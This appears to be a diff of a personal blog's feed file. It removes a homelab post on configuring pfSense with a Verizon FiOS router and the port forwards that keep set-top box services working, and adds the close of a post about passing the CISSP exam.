-&lt;h2 id=&quot;network-layout&quot;&gt;Network Layout&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2020/02/image-5-1024x364.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;configuration&quot;&gt;Configuration&lt;/h2&gt;
-
-&lt;p&gt;The first thing I configured was pfSense to work as a router between WAN and LAN. The connection between the ONT and my server is ethernet which is plugged in to one of the 2-port NIC. I had no issue receiving an IP address assigned by Verizon. However, I have read instances where clients had to clone Verizon router’s MAC address to retrieve an IP address. The second port goes to a TP-Link unmanaged switch that works as the main switching device for my entire house (Wireless AP, Printers, PlayStation, etc). After running the initial pfSense setup, a working network with access to the internet should be available.&lt;/p&gt;
-
-&lt;p&gt;Next step is to configure Verizon’s router. The router is connected to the main switch via the router’s WAN interface. The WAN interface should be configured for a Static/Manual IP address or create a static IP/MAC assignment via pfSense’s DHCP server module. Because ports will be forwarded to Verizon’s router, it is important that its IP do not change. Additionally, Verizon’s router LAN needs to be configured to use a different private network than pfSense’s LAN. For example, pfSense LAN could have 10.0.0.0/8 network and Verizon router LAN could have 192.168.1.1/24 network. In the Network configuration’s Network (Home/Office) section, the privacy setting should be disabled (see image below). If privacy setting is enabled, the Set-Top Box will be unable to access the internet and features such as On Demand and Interactive Guide will not work. Lastly, I disabled the router’s WiFi to avoid radio-waves congestion because I use another Wireless AP device.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2020/02/image-1024x509.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now that Verizon’s router has an IP assigned, I am back to the pfSense web console. I configured port forwarding in pfSense to allow the necessary connectivity for VOD, DVR, Caller ID to work. A list of required ports can be viewed in the router’s Firewall – Port Forwarding section (see image below). pfSense’s port forwarding rules (pfSense -&amp;gt; Firewall -&amp;gt; NAT) are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TCP
-    &lt;ul&gt;
-      &lt;li&gt;4567 (used by Verizon to push firmware upgrades to the router and other Verizon FiOS services)&lt;/li&gt;
-      &lt;li&gt;35000 (used by the primary Set-Top Box)&lt;/li&gt;
-      &lt;li&gt;35001-35013 (Optional. +1 Used for additional Set-Top Boxes)&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;UDP
-    &lt;ul&gt;
-      &lt;li&gt;63145 (used by the primary Set-Top Box)&lt;/li&gt;
-      &lt;li&gt;63146-63149 (Optional. +1 Used for additional Set-Top Boxes).&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2020/02/image-1-1024x492.png&quot; alt=&quot;Verizon Router Firewall – Port Forwarding automatically created rules.&quot; /&gt;
-&lt;img src=&quot;/assets/images/2020/02/image-6-1024x258.png&quot; alt=&quot;pfSense Firewall – Port Forwarding rules&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The setup is now complete. A hard reboot on the Set-Top Boxes and Verizon router should automatically configure themselves with the network changes. TV, VOD, Interactive Guide, and Caller-ID should be functioning. If not, I have ran into the issue where Verizon router retains previous network routes from the previous configuration. The routes can be deleted via Verizon router Web interface -&amp;gt; Advanced -&amp;gt; Routing -&amp;gt; Routing.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.dslreports.com/faq/verizonfios&quot;&gt;http://www.dslreports.com/faq/verizonfios&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.reddit.com/r/PFSENSE/comments/4ydgs4/pfsense_and_verizon_fios_router/&quot;&gt;https://www.reddit.com/r/PFSENSE/comments/4ydgs4/pfsense_and_verizon_fios_router/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.pfsense.org/&quot;&gt;https://www.pfsense.org/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;If it didn’t work for you, leave a comment.&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Networking" /><category term="Homelab" /><category term="fios" /><category term="moca" /><category term="pfsense" /><category term="verizon" /><category term="homelab" /><summary type="html">I have a small homelab setup at home that I use to practice cyber ninja skills and test new technology. My homelab consist of a refurbished HP Z420 Workstation with 64 GB RAM and over 2 TB of SSD storage used as a server. The server is running VMware ESXI 6.7, which hosts several VMs. One of the VMs is pfSense and has a 2 NIC adapter assigned for LAN and WAN. I also have Verizon’s FiOS G1100 router that I use for its MoCA support (Video On Demand, DVR, Caller ID, etc). However, I do not need it any of its other functionalities.</summary></entry></feed>
+<p>If you are reading this far, you might be interested in taking the CISSP exam. If you have any questions, you can comment below, and I try my best to help you.<br />
+<strong>I will NOT break the NDA or any code of ethics. Do not ask me for specifics.</strong></p>]]></content><author><name>Ian Marrero</name></author><category term="Certifications" /><category term="Personal" /><category term="cissp" /><category term="certifications" /><category term="cybersecurity" /><category term="personal" /><summary type="html"><![CDATA[I passed the CISSP exam in April 2021! Such a difficult exam! The exam is nothing like the practice tests you can find available for free or for purchase. Throughout the exam, I felt unprepared; halfway through the exam I felt like I was failing, that I should take mind-notes for my next attempt. To my surprised, I passed at 100 questions at around 110 minutes into the exam. This is how I did it…]]></summary></entry></feed>
